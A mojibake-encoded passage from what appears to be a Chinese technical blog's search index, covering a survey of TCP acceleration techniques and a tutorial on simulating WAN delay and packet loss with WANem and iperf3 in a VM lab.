è®ºæ˜¯ä»€ä¹ˆå†…å­˜æ˜ å°„æ–¹æ¡ˆï¼Œæ ¸å¿ƒéƒ½æ˜¯å‡å°‘å¤åˆ¶ã€‚\nå‡å°‘ä¸­æ–­ ç³»ç»Ÿè¦æŠŠæ•°æ®äº¤ç»™ç½‘å¡ï¼Œæˆ–è€…ç½‘å¡æ”¶åˆ°æ•°æ®è¦äº¤ç»™ç³»ç»Ÿçš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½ä¼šè§¦å‘ä¸­æ–­ã€‚æ“ä½œç³»ç»Ÿå¤„ç†ä¸­æ–­æ˜¯éœ€è¦èŠ±è´¹æ—¶é—´çš„ï¼Œå› æ­¤è¿™ä¸€æ­¥ä¹Ÿæ˜¯å¯ä»¥ä¼˜åŒ–çš„ã€‚\nå°†å¼‚æ­¥è§¦å‘å˜ä¸ºè½®è¯¢ ã€‚æœ‰äº›ç ”ç©¶è€…å°†TCP/IPçš„å¤„ç†æ”¾ç½®åˆ°ä¸€å°å•ç‹¬çš„è®¾å¤‡ä¸Šï¼Œè¿™æ ·ï¼Œå°±å¯ä»¥å°†åè®®æ•°æ®çš„æ”¶å‘å¤„ç†ç”±ä¸­æ–­çš„æ–¹å¼æ”¹å˜ä¸ºæ¯”è¾ƒç®€å•çš„ç³»ç»Ÿè½®è¯¢ã€‚è½®è¯¢çš„é¢‘ç‡æ˜¯è¦ä»”ç»†è°ƒæ•´çš„ï¼Œå¤ªæ…¢åˆ™æ•°æ®å¤„ç†äº§ç”Ÿå»¶è¿Ÿï¼Œå¤ªå¿«åˆ™ç³»ç»Ÿè´Ÿè½½è¿‡å¤§ã€‚\nä¸­æ–­åˆå¹¶ ã€‚ä¸­æ–­åˆå¹¶å°±æ˜¯å°†å¤šä¸ªä¸­æ–­åˆå¹¶åˆ°ä¸€èµ·å¤„ç†ï¼Œä¹Ÿå°±æ˜¯ä¸åœ¨æ¯æ¬¡æ”¶åˆ°æ•°æ®æ—¶äº§ç”Ÿä¸­æ–­ï¼Œè€Œæ˜¯åœ¨æ•°æ®ç§¯ç´¯åˆ°ä¸€å®šçš„é‡æ—¶å†äº§ç”Ÿä¸€æ¬¡ä¸­æ–­ã€‚è¿™ç§æ–¹æ¡ˆä½¿å¾—å»¶è¿Ÿè·ŸæŠ¥æ–‡é•¿åº¦æœ‰å…³ç³»äº†ï¼Œä¸”åœ¨å¤„ç†æ•°æ®çš„æ—¶å€™å¯èƒ½ä¸€æ¬¡å¤„ç†äº†å¤šä¸ªæŠ¥æ–‡ï¼Œåº”ç”¨ç¨‹åºçš„è°ƒåº¦ä¹Ÿå—åˆ°ä¸€äº›å½±å“ã€‚\nå¢åŠ å•ä¸ªæŠ¥æ–‡çš„é•¿åº¦ ã€‚æ€æƒ³å’Œä¸­æ–­åˆå¹¶æ˜¯ç±»ä¼¼çš„ï¼Œå°±æ˜¯å°†æŠ¥æ–‡æ•°æ®ç§¯ç´¯åˆ°ä¸€å®šé•¿åº¦å†å‘é€ã€‚ä½†è¿™ä¸€æ­¥æ˜¯äº¤ç»™ä¸Šå±‚åè®®æ¥å®Œæˆçš„ï¼Œè·Ÿä¸­æ–­åˆå¹¶æ—¶æœ‰åŒºåˆ«çš„ã€‚\næŠ¥æ–‡è¿‡æ»¤ ã€‚æ€»ä¼šæœ‰ä¸€äº›æŠ¥æ–‡æ˜¯æ²¡æ„ä¹‰çš„ï¼Œæ¯”å¦‚ä¸€äº›å¹¿æ’­æ•°æ®ã€ä¸€äº›æ²¡ç”¨çš„UDPæŠ¥æ–‡ï¼Œè¿™äº›æ•°æ®ç›´æ¥äº¤ç»™ç½‘å¡æ¥è¿‡æ»¤ï¼Œå°±èƒ½å¤Ÿå‡å°‘ä¸­æ–­ã€‚\nç”¨æˆ·çº§ä¼ è¾“åè®® ä¼ ç»Ÿçš„åè®®å¤„ç†æ˜¯åœ¨ç”¨æˆ·ç©ºé—´å†…å®Œæˆçš„ï¼Œå› æ­¤è¦å‡å°‘å¤åˆ¶ï¼Œåªèƒ½å¼•å…¥å„ç§å†…å­˜æ˜ å°„æˆ–å…±äº«çš„æ–¹æ¡ˆã€‚äººä»¬å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å®ç°ä¼ è¾“å±‚çš„åè®®ï¼ŒèŠ‚çœäº†æ•°æ®å¤åˆ¶çš„æ—¶é—´ã€‚\nTCPå¸è½½å¼•æ“ å°†è½¯ä»¶æ‰§è¡Œè½¬ç§»åˆ°ç¡¬ä»¶æ‰§è¡Œï¼Œä¸€ç›´æ˜¯æ€§èƒ½ä¼˜åŒ–çš„ä¸äºŒæ³•é—¨ã€‚å¦‚æœåœ¨ç½‘å¡ç¡¬ä»¶ä¸Šè¿è¡Œä¸€äº›ç‰¹æ®Šçš„ç³»ç»Ÿï¼Œä½¿å¾—æ•°æ®å¤„ç†ç­‰æ­¥éª¤ç›´æ¥ç”±ç½‘å¡å®Œæˆï¼Œé‚£æœ«ç³»ç»Ÿçš„è´Ÿè½½å°±å°äº†ï¼Œæ‰§è¡Œèµ·æ¥å°±å¿«äº†ã€‚\nTCPå¸è½½å¼•æ“çš„ç¼ºç‚¹æ˜¯å­˜åœ¨çš„ï¼Œé‚£å°±æ˜¯ç½‘å¡ç¡¬ä»¶æ€§èƒ½çš„æå‡è¦ä¸ç³»ç»Ÿå…¶ä»–ç¡¬ä»¶ä¿æŒåŒæ­¥ï¼Œå¦åˆ™è¿˜æ˜¯å¯èƒ½æˆä¸ºä¼ è¾“é€Ÿåº¦çš„ç“¶é¢ˆï¼›å½“ç„¶ï¼Œè¦åœ¨ç½‘å¡ä¸Šå®ç°æ•°æ®å¤„ç†çš„ç³»ç»Ÿï¼Œæœ¬èº«çš„ç¡¬ä»¶å’Œè½¯ä»¶çš„è®¾è®¡éš¾åº¦ä¹Ÿæ˜¯å¾ˆå¤§çš„ã€‚\nåè®®ç»†èŠ‚ä¼˜åŒ– æ•°æ®åŒ…å¤„ç†ä¼˜åŒ–å®é™…ä¸Šå°±æ˜¯é’ˆå¯¹æœºå™¨æœ¬èº«çš„â€œç½‘ç»œæ€§èƒ½ä¼˜åŒ–â€ï¼Œè€Œåè®®ç»†èŠ‚çš„ä¼˜åŒ–æ‰çœŸæ­£å…³ä¹TCPåè®®æœ¬èº«ã€‚\næ‹¥å¡æ§åˆ¶ä¼˜åŒ– TCPçš„æ‹¥å¡æ§åˆ¶æœºåˆ¶æˆ‘ä»¬æ˜¯ç†Ÿæ‚‰çš„ï¼Œé‚£å°±æ˜¯ï¼šæ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ï¼ˆåŠ æ³•å¢åŠ ã€ä¹˜æ³•å‡å°‘ï¼‰ã€‚å…¶å®åœ¨è¿™ä¸¤ä¸ªæœºåˆ¶çš„åŸºç¡€ä¸Šï¼Œå»¶ä¼¸å‡ºçš„å¿«é‡ä¼ å’Œå¿«æ¢å¤ä¹Ÿå±äºæ‹¥å¡æ§åˆ¶çš„ä¼˜åŒ–ï¼Œå½“ç„¶æˆ‘ä»¬è¿˜è¦æœ‰æ›´å¤šçš„å°è¯•ã€‚\né’ˆå¯¹æ‹¥å¡çŠ¶æ€çš„åˆ¤æ–­ ã€‚æˆ‘ä»¬å¦‚ä½•åˆ¤æ–­ç½‘ç»œæ˜¯å¦æ‹¥å¡å‘¢ï¼ŸTCPåè®®ä¸€èˆ¬ä»¥è¶…æ—¶å’Œé‡å¤ACKä¸ºæ ‡å‡†ã€‚è¶…æ—¶æ„å‘³ç€ä¸ä»…è‡ªå·±çš„æ•°æ®æ²¡æœ‰åˆ°è¾¾ï¼Œå¯¹æ–¹çš„é‡å¤ACKä¹Ÿæ²¡æœ‰åˆ°è¾¾ï¼Œç½‘ç»œçš„æ‹¥å¡æƒ…å†µå·²ç»æ¯”è¾ƒä¸¥é‡äº†ï¼Œå› æ­¤ä¼ ç»Ÿçš„å¤„ç†æ–¹æ³•æ˜¯å°†å‘é€çª—å£å‡åˆ° 1 ï¼Œé˜ˆå€¼å‡åŠï¼Œé‡æ–°å¼€å§‹æ…¢å¯åŠ¨ã€‚é‡å¤ACKæ„å‘³ç€è‡ªå·±çš„æ•°æ®æ²¡æœ‰åˆ°è¾¾ï¼Œå¯¹æ–¹çš„ACKå¯ä»¥åˆ°è¾¾ï¼Œç½‘ç»œçš„æ‹¥å¡æƒ…å†µè¿˜ä¸é‚£ä¹ˆä¸¥é‡ï¼Œå› æ­¤ä¼ ç»Ÿçš„å¤„ç†æ–¹æ³•æ˜¯å°†é˜ˆå€¼å‡åŠï¼Œå‘é€çª—å£å‡åˆ°é˜ˆå€¼å¤§å°ï¼Œé‡æ–°åŠ æ³•å¢åŠ ã€‚æ…¢å¯åŠ¨å’ŒåŠ æ³•å¢åŠ éƒ½æ˜¯ä¿å®ˆçš„ï¼Œå¯¹å¸¦å®½ä¸ä¸€å®šæœ‰å……åˆ†çš„åˆ©ç”¨ï¼Œå°¤å…¶å½“ç½‘ç»œå‡ºç°äº†å°æ³¢åŠ¨çš„æ—¶å€™ï¼Œå¦‚æœè¯¯åˆ¤ä¸ºæ‹¥å¡ï¼Œå°±ä¼šå¯¼è‡´ä¼ è¾“é€Ÿåº¦éª¤é™ï¼Œè€Œå¸¦å®½ç©ºé—²ã€‚\næœ‰è‹¥å¹²ç§é’ˆå¯¹æ‹¥å¡çŠ¶æ€çš„åˆ¤æ–­æ–¹æ¡ˆï¼Œä¾‹å¦‚zetaTCPä½¿ç”¨äº†åŠ¨æ€å­¦ä¹ çš„æ–¹æ³•åˆ¤æ–­æ‹¥å¡ï¼Œè¿‡æ»¤éæ‹¥å¡æƒ…å†µå¼•èµ·çš„ä¸¢åŒ…ç°è±¡ï¼Œé¢„åˆ¤æ‹¥å¡ä¸¢åŒ…çš„æ¦‚ç‡å¹¶åŸºäºè¿™ä¸€æ¦‚ç‡ç›´æ¥é‡ä¼ ã€‚Fast TCPç»“åˆå»¶è¿Ÿä¿¡æ¯åé¦ˆæ¥åˆ¤æ–­æ‹¥å¡ï¼ŒWestwoodç»“åˆå¸¦å®½æµ‹é‡çš„æŠ€æœ¯æ¥åˆ¤æ–­æ‹¥å¡ã€‚\nå‚æ•°è°ƒèŠ‚ TCPåè®®çš„å‚æ•°æ˜¯æŒ‡é¢„å…ˆå†™å¥½çš„ã€æ§åˆ¶åè®®å·¥ä½œçš„ä¸€äº›å‚æ•°ï¼Œå¦‚ç”¨äºè¿›è¡Œæ‹¥å¡é¿å…çš„æ‹¥å¡çª—å£é˜ˆå€¼ï¼Œç”¨äºä¼ è¾“æ•°æ®çš„MTUï¼Œç”¨äºåˆ¤æ–­è¶…æ—¶çš„è¶…æ—¶æ—¶é—´ç­‰ã€‚é’ˆå¯¹è¿™äº›å‚æ•°è¿›è¡Œä»”ç»†çš„è°ƒèŠ‚ï¼Œå¯ä»¥ä¸€å®šç¨‹åº¦è¾¾åˆ°TCPåŠ é€Ÿçš„ç›®çš„ã€‚\nå¹¶è¡ŒTCP å¹¶è¡ŒTCPçš„ç†å¿µæ˜¯å°†åŸæœ¬çš„ä¸€æ¡TCPè¿æ¥ä¿®æ”¹ä¸ºå¤šæ¡TCPè¿æ¥ï¼Œå°†åŸæœ¬ä½¿ç”¨ä¸€æ¡è¿æ¥æ¥ä¼ è¾“çš„æ•°æ®æ”¾åœ¨å¤šæ¡è¿æ¥ä¸Šä¼ è¾“ã€‚è¿™ç§æ€è·¯å½’æ ¹åˆ°åº•æ˜¯å¯¹æ‹¥å¡é¿å…ç®—æ³•çš„æ”¹é€ ï¼ŒåŸæœ¬ä¸€æ¡è¿æ¥ä¸Šçš„æ‹¥å¡é¿å…ç®—æ³•ï¼Œå…¶å¼ºåº¦åœ¨æ”¹ä¸ºå¤šæ¡è¿æ¥ä¹‹åå¾—åˆ°äº†å‰Šå¼±ã€‚ä¾‹å¦‚åŸæœ¬çš„æ‹¥å¡çª—å£æ˜¯ N ï¼Œæ”¹æˆ k æ¡è¿æ¥ä¹‹åå°±æˆäº† kN ï¼Œæ¯æ¬¡åœ¨æ‹¥å¡é¿å…æ—¶è¿˜æ˜¯åªæŠŠé˜ˆå€¼å‡å°‘ N/2 ï¼Œå¯¹æ€»çš„çª—å£çš„å½±å“å°±æ²¡é‚£ä¹ˆå¤§äº†ã€‚\nåŒè¾¹åŠ é€Ÿâ€”â€”ä»¥UDP Speederä¸ºä¾‹ åŒè¾¹åŠ é€Ÿè¦æ±‚åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½éƒ¨ç½²ç›¸åŒçš„åŠ é€Ÿæ–¹æ¡ˆï¼Œå¸¸è§„æ€è·¯æ˜¯æŠŠå¤æ‚çš„TCPåè®®è½¬åŒ–ä¸ºç§æœ‰çš„åè®®ã€‚ä½¿ç”¨ç§æœ‰åè®®ï¼Œå¯ä»¥å¯¹æ•°æ®åŒ…å¤„ç†ã€é‡ä¼ /æ‹¥å¡é¿å…ç­‰æœºåˆ¶è¿›è¡Œè°ƒæ•´ï¼Œä»è€Œè¾¾åˆ°åŠ é€Ÿçš„ç›®çš„ã€‚\nä»¥å¼€æºçš„ UDP Speeder ä¸ºä¾‹ï¼Œè¯¥ç³»ç»Ÿåœ¨å®¢æˆ·-æœåŠ¡å™¨ä¹‹é—´æ¶è®¾äº†ä¸€æ¡éš§é“ï¼Œåœ¨éš§é“ä¸­ä¼ è¾“çš„æ•°æ®ä½¿ç”¨äº†å‰å‘çº é”™ç¼–ç ï¼Œä½¿å¾—æ•°æ®å³ä¾¿åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­äº§ç”Ÿäº†ä¸€äº›é”™è¯¯å’Œä¸¢å¤±ï¼Œä¹Ÿèƒ½é€šè¿‡å†—ä½™çš„ç¼–ç æ•°æ®æ¥æŠŠåŸå§‹æ•°æ®æ¢å¤è¿‡æ¥ã€‚\nåœ¨å®¢æˆ·ç«¯ï¼ŒUDP Speederä¼šå¼€æ”¾ä¸€ä¸ªç›‘å¬ç«¯å£ï¼Œç›‘å¬ç”¨æˆ·ç»™åˆ°çš„æ•°æ®ï¼›ä¼šå¼€æ”¾ä¸€ä¸ªå‘é€ç«¯å£ï¼Œç”¨äºæŠŠæ•°æ®å‘é€åˆ°è¿œç«¯æœåŠ¡ã€‚ç›‘å¬ç«¯å£æ”¶åˆ°æ•°æ®ä¹‹åï¼Œé¦–å…ˆè¿›è¡Œç¼–ç ç­‰å¤„ç†ï¼Œç„¶åå°†æ•°æ®é€šè¿‡å‘é€ç«¯å£å‘é€å‡ºå»ã€‚\nåœ¨æœåŠ¡ç«¯ï¼ŒUDP Speederä¹Ÿä¼šå¼€æ”¾ä¸€ä¸ªç›‘å¬ç«¯å£ï¼Œç›‘å¬æ¥è‡ªå¹¿åŸŸç½‘çš„æ•°æ®ï¼›æ ¹æ®æ”¶åˆ°çš„æ•°æ®ç®¡ç†è¿æ¥ï¼Œæ¯ä¸ªè¿æ¥å¯¹åº”ä¸€ä¸ªç‹¬ç«‹çš„å‘é€ç«¯å£ï¼Œç”¨äºæŠŠè¯¥è¿æ¥çš„æ•°æ®å‘é€ç»™æœåŠ¡ç¨‹åºã€‚ç›‘å¬ç«¯å£æ”¶åˆ°å¹¿åŸŸç½‘ä¼ æ¥çš„æ•°æ®åï¼Œé¦–å…ˆè¿›è¡Œè§£ç ï¼Œçº é”™/æ¢å¤ä¼ è¾“è¿‡ç¨‹ä¸­æ”¶åˆ°å½±å“çš„éƒ¨åˆ†ï¼Œç„¶åé€åˆ°è¯¥è¿æ¥å¯¹åº”çš„å‘é€ç«¯å£ï¼Œå‘é€ç»™æœåŠ¡ç¨‹åºã€‚\nä»UDP Speederä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°åŒè¾¹TCPåŠ é€Ÿçš„åŸºæœ¬ç†å¿µï¼Œå°±æ˜¯é’ˆå¯¹æ•°æ®è¿›è¡Œä¸€ä¸ªåŒæ–¹åå•†å¥½çš„å¤„ç†ï¼Œå…¶ç›®çš„æ˜¯æé«˜å¸¦å®½çš„åˆ©ç”¨æ•ˆç‡ï¼Œå‡å°‘ä¸å¿…è¦çš„æ•°æ®é‡ä¼ ç­‰ã€‚UDP Speederåªèƒ½å®ç°é’ˆå¯¹UDPæ•°æ®çš„åŠ é€Ÿï¼Œä½†æ˜¯é…åˆåŸºäºUDPçš„VPNç¨‹åºï¼Œå¦‚Open VPNç­‰ï¼Œå¯ä»¥å®ç°å¯¹TCPçš„åŠ é€Ÿã€‚\næˆ‘å¯¹UDP Speederçš„æºç è¿›è¡Œäº†åˆ†æï¼Œå¦‚æœå¸Œæœ›æ›´åŠ ç»†è‡´çš„äº†è§£å®ƒçš„å·¥ä½œæµç¨‹ï¼Œä¸‹é¢çš„ä¸¤å¼ å›¾å¯ä»¥èµ·åˆ°å¸®åŠ©ï¼š\nå®¢æˆ·ç«¯ æœåŠ¡ç«¯ å‚è€ƒèµ„æ–™ [1] ç‹åœ£,è‹é‡‘æ ‘.TCPåŠ é€ŸæŠ€æœ¯ç ”ç©¶ç»¼è¿°[J].è½¯ä»¶å­¦æŠ¥,2004,15(11):1689-1697\n[2] ç‹å»ºæ–°,å½­å¨œ.å¹¿åŸŸç½‘åŠ é€ŸæŠ€æœ¯ç ”ç©¶ç»¼è¿°[J].æŠ€æœ¯äº¤æµ.2009,5\n[3] é’Ÿç³å.æ·±åº¦è§£æZetaTCPå•è¾¹åŠ é€ŸæŠ€æœ¯[J].æŠ€æœ¯ç ”å‘.2015\n[4] David X. Wei,Cheng Jin,Steven H. Low, et al.FAST TCP: Motivation, Architecture, Algorithms,Performance[J].IEEE/ACM TRANSACTIONS ON NETWORKING,2006,14(6):1246-1258\n[5] Giuseppe Siracusano,Roberto Bifulco,Simon Kuenzer et al.On-the-Fly TCP Acceleration with Miniproxy[J].Extended version of paper published in ACM HotMiddlebox.2016,5.\n[6] Tom Kelly.Scalable TCP: Improving Performance in Highspeed Wide Area Networks[J].2002,12.\n[7] è’‹å»ºå†›,é™†å¹³.åŸºäº TCP åè®®åŠ é€Ÿçš„å•è¾¹åŠ é€Ÿæ¨¡å‹ç ”ç©¶ä¸å®ç°[J].ä¿¡æ¯æŠ€æœ¯,2015(2):160-164\n[8] æ—ç¿.åŸºäº 4G æ ¸å¿ƒç½‘é€æ˜ä»£ç†è¿›è¡Œ TCPåŠ é€Ÿçš„æ•ˆæœåˆ†æ[J].é€šä¿¡è®¾è®¡ä¸åº”ç”¨.2020,2.\n[9] å½­å¨œ.å¹¶è¡ŒTCPåœ¨å¹¿åŸŸç½‘åŠ é€Ÿç³»ç»Ÿä¸­çš„ç ”ç©¶ä¸å®ç°[D].ä¸­å—å¤§å­¦.2009.\n[10] èµµæ¬£,æ—¶å‘æ³‰,å´çº¯é’.æ”¯æŒTCP/IPå¸è½½å¼•æ“çš„åè®®æ ˆçš„è®¾è®¡ä¸å®ç°[J].å¾®ç”µå­å­¦ä¸è®¡ç®—æœº,2006(S1)\n[11] S.Floyd.RFC.3649.HighSpeed TCP.2003\n","date":"2021-11-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/tcp%E5%8A%A0%E9%80%9F%E6%8A%80%E6%9C%AF%E7%AE%80%E8%BF%B0/","title":"TCPåŠ é€ŸæŠ€æœ¯ç®€è¿°"},{"content":"æˆ‘ä»¬å¯èƒ½é‡åˆ°è¿™æ ·çš„æƒ…æ™¯ï¼šæœ‰ä¸€äº›å®éªŒéœ€è¦åœ¨å¹¿åŸŸç½‘ç¯å¢ƒä¸‹ï¼ˆå­˜åœ¨ä¸€å®šçš„å»¶è¿Ÿã€ä¸¢åŒ…ç­‰ï¼‰å®Œæˆï¼Œä½†æˆ‘ä»¬ä¸å¸Œæœ›èŠ±è´¹æˆæœ¬å»ç§Ÿå€Ÿä¸€å°äº‘æœåŠ¡å™¨ï¼Œåªå¸Œæœ›åœ¨è™šæ‹Ÿæœºç½‘ç»œä¸­æ¨¡æ‹Ÿå‡ºå¹¿åŸŸç½‘çš„ç¯å¢ƒï¼Œåº”è¯¥å¦‚ä½•å®ç°å‘¢ï¼Ÿ\næœ¬æ–‡æ˜¯TCPåŠ é€Ÿç³»åˆ—æ€»ç»“çš„ä¸€éƒ¨åˆ† ï¼Œæˆ‘ä»¬å¸Œæœ›å®ŒæˆTCPåŠ é€Ÿçš„å®éªŒï¼Œè¿™æ—¶è¦æ±‚æˆ‘ä»¬çš„å®éªŒç¯å¢ƒä¸ä»…æ˜¯ä¸€ä¸ªå¹¿åŸŸç½‘ï¼Œè¿˜éœ€è¦æ˜¯ä¸€ä¸ªå­˜åœ¨ ä¸€å®šæ‹¥å¡ ã€ä¼šå‘ç”Ÿ ä¸€å®šä¸¢åŒ… çš„å¹¿åŸŸç½‘ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨æ¨¡æ‹Ÿç¯å¢ƒï¼Œè€Œä½¿ç”¨çœŸå®æœåŠ¡å™¨çš„è¯ï¼Œå®éªŒæ•ˆæœå°±å¯èƒ½å—åˆ°æœåŠ¡å™¨åœ°ç†ä½ç½®ã€å®éªŒæ—¶é—´æ®µç­‰ç­‰å› ç´ çš„å½±å“äº†ã€‚\nå¥½åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨WANemè¿™ä¸€ç¨³å®šã€æ˜“ç”¨çš„å¹¿åŸŸç½‘æ¨¡æ‹Ÿå™¨æ¥è§£å†³æˆ‘ä»¬çš„é—®é¢˜ã€‚\nç®€ä»‹ WANemåŸºäºiptableså’Œtcï¼ˆTraffic Controlï¼‰å®ç°ï¼Œå¯ä»¥å®ç°å¯¹ç½‘ç»œå»¶è¿Ÿã€ä¸¢åŒ…ç‡ã€æŠ–åŠ¨ã€å™ªéŸ³ç­‰çš„æ¨¡æ‹Ÿï¼Œä½¿ç”¨è€…å¯ä»¥ç®€å•åœ°è®¾å®šå¹¶å¤ç°å‡ºæŸä¸ªç‰¹å®šçš„ç½‘ç»œç¯å¢ƒï¼Œå› è€Œé€æ¸æ›¿ä»£è½¯ä»¶ä»¿çœŸæˆä¸ºæ–°ä¸€ä»£çš„ç½‘ç»œæµ‹è¯•åºŠã€‚ä¸ä¹‹å…·å¤‡ç±»ä¼¼æ¦‚å¿µçš„å·¥å…·æœ‰å¾®è½¯çš„Network Emulator for Windows Toolkitï¼ˆNEWTï¼‰ã€Linux 2.6è‡ªå¸¦çš„Netemç­‰ã€‚äº‹å®ä¸Šï¼Œæ­¤å‰è¯´çš„tcï¼ˆTraffic Controlï¼‰å°±æ˜¯ç”¨æ¥æ§åˆ¶Netemå·¥ä½œçš„ï¼Œå› æ­¤å¯ä»¥ç†è§£ä¸ºWANemæ˜¯åŸºäºNetemæ‰€æ„å»ºã€‚\nå®‰è£…ä¸è®¿é—® WANemç±»ä¼¼äºä¸€å°è™šæ‹Ÿæœºï¼Œå¯ä»¥ç›´æ¥ ä¸‹è½½ isoæ–‡ä»¶ï¼Œå¹¶åœ¨VMWareä¸­å®‰è£…ã€‚Linuxç±»å‹é€‰æ‹© å…¶ä»–Linux 64ä½ å³å¯ã€‚\nå¯åŠ¨ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨DHCPè·å–IPï¼Œæˆ–è€…æ‰‹åŠ¨é…ç½®IPï¼›è™šæ‹Ÿæœºä¼šè¦æ±‚ä½ è®¾ç½®å£ä»¤ï¼Œä½ å¯ä»¥ä½¿ç”¨ç”¨æˆ·å perc å’Œä½ è®¾ç½®çš„å£ä»¤æ¥è¿œç¨‹ç™»å½•åˆ°ç³»ç»Ÿä¸Šã€‚\næˆåŠŸå¯åŠ¨ä¹‹åï¼Œä¼šå‡ºç° WANemControl@PERC\u0026gt; çš„å‘½ä»¤è¡Œæç¤ºç¬¦ï¼Œä½¿ç”¨ help å‘½ä»¤å¯ä»¥æŸ¥çœ‹è¯¥å‘½ä»¤è¡Œæ”¯æŒçš„å‘½ä»¤ã€‚\nä¸€èˆ¬æ¥è¯´ï¼Œä½ ç°åœ¨å°±å¯ä»¥åœ¨å¦ä¸€å°æœºå™¨çš„æµè§ˆå™¨ä¸Šä½¿ç”¨ http://\u0026lt;WANem IP\u0026gt;/WANem æ¥è®¿é—®æ§åˆ¶ç•Œé¢äº†ï¼ˆæ³¨æ„URLå¤§å°å†™ï¼‰ã€‚å‡å¦‚ä½ ä¸çŸ¥é“WANemçš„IPåœ°å€ï¼Œåˆ™ä½¿ç”¨ exit2shell å‘½ä»¤æ¥è¿”å›åˆ°Linuxå‘½ä»¤è¡Œä¸­ï¼Œä½¿ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„ ip addr å‘½ä»¤å°±å¯ä»¥çœ‹åˆ°WANemçš„IPã€‚\næˆåŠŸè®¿é—®WANem é…ç½®è§„åˆ™ é¦–æ¬¡è¿›å…¥æ§åˆ¶ç•Œé¢æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æ˜¯WANemçš„ Basic Mode ï¼Œè¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½® å¸¦å®½ å’Œ å»¶è¿Ÿ ã€‚\nç‚¹å‡»å¯¼èˆªæ ä¸­çš„ Advanced Mode è¿›å…¥é«˜çº§é…ç½®ï¼Œæˆ‘ä»¬çœ‹åˆ°å¦‚ä¸‹çš„ç•Œé¢ï¼š\nAdvanced Mode ç•Œé¢ä¸Šå·²ç»å°†å„é¡¹æŒ‡æ ‡éƒ½æ ‡è¯†å¾—æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œå› æ­¤ä¸å¤šè´¹å£èˆŒè§£é‡Šã€‚åœ¨ä¸Šå›¾ä¸­ï¼Œæˆ‘ä»¬å·²ç»å†™å¥½äº†ä¸€æ¡â€å»¶è¿Ÿ100msã€éšæœºä¸¢åŒ…ç‡20%â€œçš„è§„åˆ™ã€‚\nå¯ä»¥æŒ‡å®šæˆ‘ä»¬çš„è§„åˆ™çš„é€‚ç”¨èŒƒå›´ï¼Œå¦‚æœä½ åªå¸Œæœ›ä½ é…ç½®çš„è§„åˆ™åœ¨ä¸¤å°ç‰¹å®šä¸»æœºä¹‹é—´ç”Ÿæ•ˆï¼Œé‚£ä¹ˆå°±å¡«å†™ä¸‹å›¾çº¢æ¡†æ¡†å‡ºçš„ä¸€è¡Œï¼Œå¦åˆ™ä¿ç•™åŸæ ·å³å¯ã€‚\nè§„åˆ™ ä½¿ç”¨ ä¿å­˜æˆ‘ä»¬è®¾ç½®å¥½çš„è§„åˆ™ï¼Œå³åˆ»å¼€å§‹ä½¿ç”¨å®ƒå§ã€‚\næˆ‘ä»¬çš„ä¸¤å°å®éªŒæœºå™¨åˆ†åˆ«æ˜¯ CentOS7 192.168.213.128 å’Œ Ubuntu 192.168.213.129 ï¼ŒWANemæ˜¯ 192.168.213.130 ã€‚\né¦–å…ˆå¯ä»¥ä½¿ç”¨ iperf3 æ¥æµ‹è¯•ä¸€ä¸‹ä¸¤å°æœºå™¨ä¹‹é—´çš„ç½‘ç»œæƒ…å†µï¼ˆç†æ‰€å½“ç„¶åœ°å¥½ï¼‰ã€‚\nåœ¨Ubuntuä¸Šè¿è¡Œ iperf3 -s å‘½ä»¤ï¼š\niperf server åœ¨CentOSä¸Šè¿è¡Œ iperf3 -c 192.168.213.129 å‘½ä»¤ï¼Œè¯¥å·¥å…·å°†ä¼šè‡ªåŠ¨æµ‹è¯•ä»å®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„å¸¦å®½æƒ…å†µï¼š\niperf client æ¥ç€ï¼Œæˆ‘ä»¬å¼•å…¥WANemã€‚åœ¨CentOSä¸Šæ·»åŠ è·¯ç”±ï¼Œä½¿å¾—å®ƒåˆ°Ubuntuçš„æ‰€æœ‰æµé‡éƒ½è¦ç»è¿‡WANemã€‚\næ·»åŠ è·¯ç”± å†æ¬¡ä½¿ç”¨ iperf3 -c 192.168.213.129 è¿›è¡Œæµ‹è¯•ï¼Œæ•ˆæœå¾ˆæ˜æ˜¾ï¼š\niperf client å¯ä»¥çœ‹åˆ°ï¼Œé¦–å…ˆç”±äºæ—¶å»¶çš„å½±å“ï¼Œå¸¦å®½ä¸‹é™äº†ï¼Œå…¶æ¬¡æ˜¯äº§ç”Ÿäº†ä¸€äº›ä¸¢åŒ…ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ iperf3 -u -c 192.168.213.129 å‘½ä»¤æ¥å¯ç”¨UDPæ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹ä¼šç»Ÿè®¡ä¸¢åŒ…ç‡ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä¸¢åŒ…ç‡è·Ÿæˆ‘ä»¬æ­¤å‰è®¾ç½®çš„ 20% æ˜¯æ¥è¿‘çš„ã€‚\niperf UDP ç»¼ä¸Šæ‰€è¿°ï¼Œæœ‰äº†è¿™ä¸ªç¯å¢ƒï¼Œå°±å¯ä»¥æ„‰å¿«åœ°åœ¨å±€åŸŸç½‘ä¸­æ¨¡æ‹Ÿå‡ºå¹¿åŸŸç½‘ç¯å¢ƒäº†ã€‚\nå‚è€ƒèµ„æ–™ [1] å¾®ä¿¡æµ‹è¯•å·¥ç¨‹å¸ˆæ‰‹æŠŠæ‰‹æ•™ä½ åšå¼±ç½‘ç»œæ¨¡æ‹Ÿæµ‹è¯• - çŸ¥ä¹\n[2] Linuxç½‘ç»œæµé‡æ§åˆ¶å·¥å…·â€”Netem - å‘å¡ - åšå®¢å›­ (cnblogs.com)\n[3] TC(Traffic Control)å‘½ä»¤â€”linuxè‡ªå¸¦é«˜çº§æµæ§ - äº‘+ç¤¾åŒº - 